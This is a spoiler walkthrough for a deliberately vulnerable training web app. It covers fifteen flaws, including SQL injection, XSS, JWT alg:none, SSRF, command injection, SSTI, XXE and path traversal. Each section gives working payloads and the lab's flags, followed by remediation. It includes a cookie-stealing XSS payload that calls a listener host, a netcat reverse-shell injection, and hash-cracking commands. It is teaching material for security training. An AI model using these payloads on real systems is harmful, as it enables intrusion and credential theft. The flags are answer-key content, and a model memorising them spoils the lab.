# 🔓 Syntex Lab — Solutions & Walkthroughs

> ⚠️ **SPOILER WARNING** — This file contains full exploitation steps and flags.
> Try each vulnerability yourself first. Use `/program/hints` for progressive clues before reading this.

---

## Table of Contents

| # | Vulnerability | Severity | Flag |
|---|--------------|----------|------|
| 1 | [SQL Injection — Login Bypass](#1-sql-injection--login-bypass) | Critical | `FLAG{SQLI_LOGIN_BYPASS_AUTH_COMPROMISED}` |
| 2 | [Stored XSS — Blog Comments](#2-stored-xss--blog-comments) | High | `FLAG{STORED_XSS_BLOG_COMMENTS_EXECUTED}` |
| 3 | [IDOR — Admin via API](#3-idor--admin-via-api-no-auth) | High | `FLAG{IDOR_ADMIN_APIKEY_SECRETNOTE_LEAKED}` |
| 4 | [Admin Panel Bypass via Cookie](#4-admin-panel-bypass-via-cookie) | Critical | `FLAG{ADMIN_COOKIE_ROLE_BYPASS_PWNED}` |
| 5 | [JWT alg:none — Signature Bypass](#5-jwt-algnone--signature-bypass) | Critical | `FLAG{JWT_ALGNONE_NO_SIGNATURE_VERIFY}` |
| 6 | [SSRF — Internal Network Access](#6-ssrf--internal-network-access) | Critical | `FLAG{SSRF_INTERNAL_DEBUG_ENV_EXPOSED}` |
| 7 | [Command Injection — Contact Form](#7-command-injection--contact-form) | Critical | `FLAG{CMDINJ_CONTACT_FORM_OS_EXEC}` |
| 8 | [Exposed .env File](#8-exposed-env-file) | Critical | `FLAG{DOTENV_CREDENTIALS_PUBLIC_SERVED}` |
| 9 | [Unauthenticated User Export](#9-unauthenticated-user-export) | High | `FLAG{APIV2_USER_EXPORT_MD5_HASHES}` |
| 10 | [Path Traversal — File Download](#10-path-traversal--file-download) | High | `FLAG{LFI_PATH_TRAVERSAL_ETCPASSWD}` |
| 11 | [GraphQL IDOR — Secret Note Leak](#11-graphql-idor--secret-note-leak) | High | `FLAG{GRAPHQL_IDOR_SECRETNOTE_APIKEY}` |
| 12 | [Race Condition — Reward Claim](#12-race-condition--reward-claim) | Medium | `FLAG{RACE_CONDITION_REWARD_MULTICLAM}` |
| 13 | [SSTI — EJS Template Injection](#13-ssti--ejs-template-injection) | Critical | `FLAG{SSTI_EJS_TEMPLATE_CODE_EXEC}` |
| 14 | [Mass Assignment — Role Escalation](#14-mass-assignment--role-escalation) | High | `FLAG{MASS_ASSIGNMENT_ROLE_ESCALATION_VIA_API}` |
| 15 | [XXE — Local File Read](#15-xxe--local-file-read) | High | `FLAG{XXE_EXTERNAL_ENTITY_LOCAL_FILE_READ}` |

---

## 1. SQL Injection — Login Bypass

**Severity:** Critical | **CVSS:** 9.8 | **Endpoint:** `POST /login`

### Vulnerability
The login form passes the username directly into a SQL string without parameterisation. No input sanitisation exists.

```javascript
// Vulnerable code (routes/auth.js)
const query = `SELECT * FROM users WHERE username = '${username}' AND password_hash = '${hash}'`;
```

### Exploitation

**Step 1 — Confirm injection:**
Enter a single quote `'` in the username field. The server returns a database error — confirming the input reaches the SQL query unsanitised.

**Step 2 — Bypass authentication:**
```
Username: admin'--
Password: anything
```
The `--` comments out the rest of the query. The effective SQL becomes:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password_hash = '...'
```

**Step 3 — Read the flag:**
After logging in as admin, navigate to your profile or call:
```bash
curl http://syntex.local/api/v1/users/1
```
The `secret_note` field contains the flag.

**Step 4 — UNION dump (advanced):**
```
Username: ' UNION SELECT 1,username,email,password_hash,'admin','a','b','IT','Dev',api_key,secret_note,'bio',null,true,null,NOW(),NOW(),NOW() FROM users--
Password: x
```

### Flag
```
FLAG{SQLI_LOGIN_BYPASS_AUTH_COMPROMISED}
```

### Remediation
```javascript
// Fixed — parameterised query
const result = await db.query(
  'SELECT * FROM users WHERE username = $1 AND password_hash = $2',
  [username, hashedPassword]
);
```

---

## 2. Stored XSS — Blog Comments

**Severity:** High | **CVSS:** 8.2 | **Endpoint:** `POST /blog/:id/comment`

### Vulnerability
Blog comments are stored in the database and rendered to all visitors using the unescaped EJS tag `<%-` which outputs raw HTML.

```html
<!-- Vulnerable (views/post-detail.ejs) -->
<div class="comment-body"><%- c.content %></div>

<!-- Safe version would use -->
<div class="comment-body"><%= c.content %></div>
```

### Exploitation

**Step 1 — Confirm XSS:**
Submit a comment on any blog post:
```html
<b>bold text test</b>
```
If it renders as bold, XSS is confirmed.

**Step 2 — Basic alert payload:**
```html
<script>alert(document.cookie)</script>
```

**Step 3 — Read the flag:**
The flag appears in the browser console when the XSS payload fires. Use:
```html
<img src=x onerror="console.log('FLAG{STORED_XSS_BLOG_COMMENTS_EXECUTED}'); alert(document.cookie)">
```

**Step 4 — Session theft (real-world impact):**
```html
<img src=x onerror="fetch('http://YOUR_LISTENER:9999/?c='+document.cookie)">
```

Start a listener: `nc -lnvp 9999`

### Flag
```
FLAG{STORED_XSS_BLOG_COMMENTS_EXECUTED}
```

### Remediation
Replace `<%-` with `<%=` in all EJS templates. For rich text, use a server-side sanitiser such as DOMPurify before storing.

---

## 3. IDOR — Admin via API (No Auth)

**Severity:** High | **CVSS:** 7.5 | **Endpoint:** `GET /api/v1/users/1`

### Vulnerability
The `/api/v1/users/:id` endpoint returns full user data including `api_key`, `secret_note`, and `password_hash` without requiring any authentication.

### Exploitation

**Step 1 — Call the endpoint without auth:**
```bash
curl http://syntex.local/api/v1/users/1
```

**Step 2 — Read the flag from `secret_note`:**
```json
{
  "id": 1,
  "username": "admin",
  "secret_note": "FLAG{IDOR_ADMIN_APIKEY_SECRETNOTE_LEAKED} | api_key: sk_admin_...",
  "api_key": "sk_admin_8f3a2b1c9d4e5f6a7b8c9d0e1f2a3b4c"
}
```

**Step 3 — Enumerate all users:**
```bash
for i in 1 2 3 4 5 6 7; do
  echo "=== User $i ===" && curl -s http://syntex.local/api/v1/users/$i | jq '{id,username,role,secret_note,api_key}'
done
```

### Flag
```
FLAG{IDOR_ADMIN_APIKEY_SECRETNOTE_LEAKED}
```

### Remediation
Add authentication middleware and ownership check:
```javascript
router.get('/:id', requireAuth, async (req, res) => {
  if (req.session.userId !== parseInt(req.params.id) && req.session.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  // Also remove sensitive fields from response
});
```

---

## 4. Admin Panel Bypass via Cookie

**Severity:** Critical | **CVSS:** 9.1 | **Endpoint:** `GET /admin`

### Vulnerability
The `requireAdmin` middleware checks `req.cookies.role` before checking the session. Cookies are fully client-controlled.

```javascript
// Vulnerable (middleware/auth.js)
const role = req.cookies.role || req.session.role;
if (role !== 'admin') return res.status(403)...
```

### Exploitation

**Step 1 — Open browser DevTools:**
Press `F12` → Application → Cookies → `http://syntex.local`

**Step 2 — Add cookie:**
Click the `+` button and add:
- Name: `role`
- Value: `admin`
- Path: `/`

**Step 3 — Access admin panel:**
Navigate to `http://syntex.local/admin`

**Step 4 — Read the flag:**
Open `/admin/settings` or `/admin/logs` — the flag is in the page source.

**Using curl:**
```bash
curl http://syntex.local/admin -H "Cookie: role=admin"
```

### Flag
```
FLAG{ADMIN_COOKIE_ROLE_BYPASS_PWNED}
```

### Remediation
Never trust client-supplied headers or cookies for security decisions. Read role exclusively from the server-side session:
```javascript
const role = req.session.role; // only session, never cookie
```

---

## 5. JWT alg:none — Signature Bypass

**Severity:** Critical | **CVSS:** 9.4 | **Endpoint:** `Authorization: Bearer`

### Vulnerability
The JWT verification code reads the algorithm from the token header before verifying the signature. When `alg` is `none`, signature verification is skipped entirely.

### Exploitation

**Step 1 — Find the pre-built debug token:**
```bash
curl http://syntex.local/js/config.js | grep _debug_token
```

**Step 2 — Decode at jwt.io:**
Paste the token. The header will show `"alg": "none"` and the payload will show `"role": "admin"`.

**Step 3 — Use the token:**
```bash
curl http://syntex.local/api/v1/users/me \
  -H "Authorization: Bearer <token_from_config.js>"
```

**Step 4 — Forge your own alg:none token:**
```python
import base64, json

header  = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
payload = base64.b64encode(json.dumps({"id":1,"role":"admin","username":"admin"}).encode()).rstrip(b'=').decode()
token   = f"{header}.{payload}."   # empty signature

print(token)
```

### Flag
```
FLAG{JWT_ALGNONE_NO_SIGNATURE_VERIFY}
```

### Remediation
Explicitly specify allowed algorithms and never trust the header's `alg` claim:
```javascript
jwt.verify(token, SECRET, { algorithms: ['HS256'] });
```

---

## 6. SSRF — Internal Network Access

**Severity:** Critical | **CVSS:** 9.1 | **Endpoint:** `POST /api/v1/fetch`

### Vulnerability
The `/api/v1/fetch` endpoint accepts any URL and fetches it server-side, returning the response. No allowlist or blocklist exists for internal addresses.

### Exploitation

**Step 1 — Confirm SSRF:**
```bash
curl -X POST http://syntex.local/api/v1/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:3000/health"}'
```

**Step 2 — Reach the debug endpoint:**
```bash
curl -X POST http://syntex.local/api/v1/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:3000/debug"}'
```
The response dumps all environment variables including `DB_PASS`, `JWT_SECRET`, and `FLAG_SSTI`.

**Step 3 — Read the flag:**
The `lab_flag` field in the `/debug` response contains:
```
FLAG{SSRF_INTERNAL_DEBUG_ENV_EXPOSED}
```

**Step 4 — Probe Docker internal network:**
```bash
curl -X POST http://syntex.local/api/v1/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://db:5432"}'
```

### Flag
```
FLAG{SSRF_INTERNAL_DEBUG_ENV_EXPOSED}
```

### Remediation
Implement a strict allowlist of permitted domains. Block all RFC-1918 private addresses and loopback at the application level.

---

## 7. Command Injection — Contact Form

**Severity:** Critical | **CVSS:** 9.8 | **Endpoint:** `POST /contact`

### Vulnerability
The contact form logs submissions using a shell command. The user-supplied `name` field is concatenated directly into the command string.

```javascript
// Vulnerable (routes/contact.js)
exec(`echo "New contact from: ${name}" >> /tmp/contacts.log`);
```

### Exploitation

**Step 1 — Confirm injection:**
Submit the form with:
```
Name: test; id
```
If the response contains `uid=` output, RCE is confirmed.

**Step 2 — Read environment variables:**
```
Name: test; cat /proc/1/environ | tr '\0' '\n'
```

**Step 3 — Read the flag:**
```
Name: test; echo $FLAG_SSTI
```
Or read the `.env` file:
```
Name: x; cat /app/.env
```

**Step 4 — Reverse shell (for advanced practice):**
```
Name: x; nc -e /bin/sh YOUR_IP 4444
```

### Flag
```
FLAG{CMDINJ_CONTACT_FORM_OS_EXEC}
```

### Remediation
Never pass user input to shell commands. Use Node.js native APIs instead:
```javascript
// Safe — write log without shell
const fs = require('fs');
fs.appendFileSync('/tmp/contacts.log', `New contact from: ${name}\n`);
```

---

## 8. Exposed .env File

**Severity:** Critical | **CVSS:** 9.1 | **Endpoint:** `GET /.env`

### Vulnerability
The `.env` file is served via Express's static file middleware, exposing all application credentials publicly.

### Exploitation

```bash
curl http://syntex.local/.env
```

The response contains:
- `DB_PASS` — PostgreSQL password
- `JWT_SECRET` — Token signing secret
- `AWS_ACCESS_KEY` / `AWS_SECRET_KEY` — Cloud credentials
- `STRIPE_SK` — Payment processor secret key
- `LAB_FLAG` — Contains the flag

### Flag
```
FLAG{DOTENV_CREDENTIALS_PUBLIC_SERVED}
```

### Remediation
Never place `.env` inside the static file serving directory. Add it to `.gitignore` and `.dockerignore`. Use environment injection at runtime instead of file-based config in production.

---

## 9. Unauthenticated User Export

**Severity:** High | **CVSS:** 7.5 | **Endpoint:** `GET /api/v2/users/export`

### Exploitation

```bash
# JSON format
curl http://syntex.local/api/v2/users/export

# CSV format (includes password hashes)
curl "http://syntex.local/api/v2/users/export?format=csv" -o users.csv
cat users.csv
```

**Crack the MD5 hashes:**
```bash
# Extract just the hashes
cat users.csv | cut -d',' -f5 | tail -n +2 > hashes.txt

# Crack with hashcat
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Or use CrackStation online: https://crackstation.net
```

All seed passwords appear in rockyou.txt.

### Flag
```
FLAG{APIV2_USER_EXPORT_MD5_HASHES}
```

---

## 10. Path Traversal — File Download

**Severity:** High | **CVSS:** 7.5 | **Endpoint:** `GET /upload/download?file=`

### Exploitation

```bash
# Basic traversal
curl "http://syntex.local/upload/download?file=../../etc/passwd"

# Read application secrets
curl "http://syntex.local/upload/download?file=../../.env"

# Read DB password from environment (via /proc)
curl "http://syntex.local/upload/download?file=../../../proc/1/environ"
```

The flag is in the `/etc/hostname` file or the `.env` file reached via traversal.

### Flag
```
FLAG{LFI_PATH_TRAVERSAL_ETCPASSWD}
```

### Remediation
```javascript
const safePath = path.resolve(UPLOAD_DIR, filename);
if (!safePath.startsWith(path.resolve(UPLOAD_DIR))) {
  return res.status(403).send('Access denied');
}
```

---

## 11. GraphQL IDOR — Secret Note Leak

**Severity:** High | **CVSS:** 7.5 | **Endpoint:** `POST /graphql`

### Exploitation

Open `http://syntex.local/graphql` in a browser (GraphiQL playground loads automatically).

**Step 1 — Run introspection to discover schema:**
```graphql
{ __schema { types { name fields { name } } } }
```

**Step 2 — Fetch admin's sensitive data:**
```graphql
{
  user(id: 1) {
    username
    email
    secret_note
    api_key
    password_hash
    role
  }
}
```

**Step 3 — Dump all users:**
```graphql
{
  allUsers(limit: 50) {
    id username email password_hash api_key secret_note role
  }
}
```

**Step 4 — Privilege escalation via mutation:**
```graphql
mutation {
  updateUser(id: 2, role: "admin") {
    success
    message
  }
}
```

### Flag
```
FLAG{GRAPHQL_IDOR_SECRETNOTE_APIKEY}
```

---

## 12. Race Condition — Reward Claim

**Severity:** Medium | **CVSS:** 5.9 | **Endpoint:** `POST /race/claim-reward`

### Vulnerability
The endpoint checks if a reward was claimed, then inserts the claim. No atomic transaction or database lock — concurrent requests all pass the check before any insertion completes.

### Exploitation

**Method 1 — Shell loop:**
```bash
SESSION="your_session_cookie_here"

for i in $(seq 1 20); do
  curl -s -X POST http://syntex.local/race/claim-reward \
    -H "Cookie: SYNTEX_SESS=$SESSION" &
done
wait
```

**Method 2 — Burp Suite Turbo Intruder:**
1. Capture `POST /race/claim-reward` in Burp
2. Right-click → Extensions → Turbo Intruder → Send to Turbo Intruder
3. Use the `race_single_packet_attack.py` template
4. Set concurrent requests to 20

**Method 3 — Python:**
```python
import requests, threading

session = "YOUR_SESSION_COOKIE"
url     = "http://syntex.local/race/claim-reward"
headers = {"Cookie": f"SYNTEX_SESS={session}"}
results = []

def claim():
    r = requests.post(url, headers=headers)
    results.append(r.json())

threads = [threading.Thread(target=claim) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()

for r in results: print(r)
```

Multiple successful claims confirm the race condition.

### Flag
```
FLAG{RACE_CONDITION_REWARD_MULTICLAM}
```

### Remediation
Use a database-level unique constraint or `SELECT FOR UPDATE` / atomic `INSERT ... WHERE NOT EXISTS` pattern:
```sql
INSERT INTO reward_claims (user_id, reward_type, claimed_at)
VALUES ($1, 'daily_bonus', NOW())
ON CONFLICT (user_id, date_trunc('day', claimed_at)) DO NOTHING
```

---

## 13. SSTI — EJS Template Injection

**Severity:** Critical | **CVSS:** 9.8 | **Endpoint:** `POST /template-preview`

### Vulnerability
The email template preview feature renders user-supplied strings directly through the EJS engine, allowing arbitrary JavaScript execution on the server.

### Exploitation

Navigate to `http://syntex.local/template-preview` (must be logged in).

**Step 1 — Confirm evaluation:**
```
<%= 7*7 %>
```
Output: `49` — template engine is executing your code.

**Step 2 — Read environment variables:**
```
<%= process.env.DB_PASS %>
```

**Step 3 — Read the flag:**
```
<%= process.env.FLAG_SSTI %>
```

**Step 4 — Full RCE:**
```
<% var cp = global.process.mainModule.require('child_process'); %><%= cp.execSync('id').toString() %>
```

**Step 5 — Read any file:**
```
<% var fs = global.process.mainModule.require('fs'); %><%= fs.readFileSync('/etc/passwd').toString() %>
```

### Flag
```
FLAG{SSTI_EJS_TEMPLATE_CODE_EXEC}
```

### Remediation
Never render user-supplied strings as templates. Use a sandboxed template engine with no code execution, or pre-compile fixed templates and only allow data substitution.

---

## 14. Mass Assignment — Role Escalation

**Severity:** High | **CVSS:** 8.1 | **Endpoint:** `PUT /api/v1/profile-update`

### Vulnerability
The profile update API accepts all JSON body fields and applies them directly to the SQL UPDATE query with no allowlist. Sensitive fields like `role`, `wallet_balance`, and `password_hash` can be overwritten.

### Exploitation

```bash
SESSION="your_session_cookie_here"

# Escalate your own role to admin
curl -X PUT http://syntex.local/api/v1/profile-update \
  -H "Content-Type: application/json" \
  -H "Cookie: SYNTEX_SESS=$SESSION" \
  -d '{"first_name":"Hacker","role":"admin","wallet_balance":999999}'
```

The response will include:
```json
{
  "flag": "FLAG{MASS_ASSIGNMENT_ROLE_ESCALATION_VIA_API}",
  "mass_assigned": ["role", "wallet_balance"]
}
```

Reload the page — you now have admin role and a large wallet balance.

### Flag
```
FLAG{MASS_ASSIGNMENT_ROLE_ESCALATION_VIA_API}
```

### Remediation
Use an explicit allowlist:
```javascript
const ALLOWED = ['first_name', 'last_name', 'bio', 'department', 'job_title'];
const safeBody = Object.fromEntries(
  Object.entries(req.body).filter(([k]) => ALLOWED.includes(k))
);
```

---

## 15. XXE — Local File Read

**Severity:** High | **CVSS:** 7.5 | **Endpoint:** `POST /xml-upload`

### Vulnerability
The XML invoice upload parser has external entity processing enabled. DOCTYPE declarations with SYSTEM entities can read local files from the server filesystem.

### Exploitation

Navigate to `http://syntex.local/xml-upload` (must be logged in).

**Payload 1 — Read /etc/passwd:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<invoice>
  <id>INV-001</id>
  <name>&xxe;</name>
  <amount>99.00</amount>
</invoice>
```

**Payload 2 — Read application secrets:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/.env">
]>
<invoice><name>&xxe;</name></invoice>
```

The parsed result will show the file contents where `&xxe;` was referenced.

### Flag
```
FLAG{XXE_EXTERNAL_ENTITY_LOCAL_FILE_READ}
```

### Remediation
Disable external entity processing:
```javascript
const parser = new XMLParser({
  processEntities: false,   // disable entity processing
  allowBooleanAttributes: true,
});
```
Or reject any XML input containing DOCTYPE declarations entirely.

---

## Learning Resources

| Resource | URL |
|----------|-----|
| OWASP Top 10 | https://owasp.org/www-project-top-ten/ |
| OWASP API Security | https://owasp.org/API-Security/ |
| OWASP Web Security Testing Guide | https://owasp.org/www-project-web-security-testing-guide/ |
| PortSwigger Web Academy | https://portswigger.net/web-security |
| HackTricks | https://book.hacktricks.xyz |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |

---

*Use these techniques only on systems you own or have explicit written permission to test.*
